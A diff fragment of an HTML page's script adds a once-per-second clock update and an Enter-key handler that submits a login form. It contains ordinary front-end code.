+                    now.getMinutes().toString().padStart(2, '0') + ':' +
+                    now.getSeconds().toString().padStart(2, '0');
+            }
+            
+            updateTime();
+            setInterval(updateTime, 1000);
+        }
+
+        // Handle Enter key for login
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && document.getElementById('loginScreen').style.display !== 'none') {
+                authenticate();
+            }
+        });
+
     </script>
 </body>
 </html>
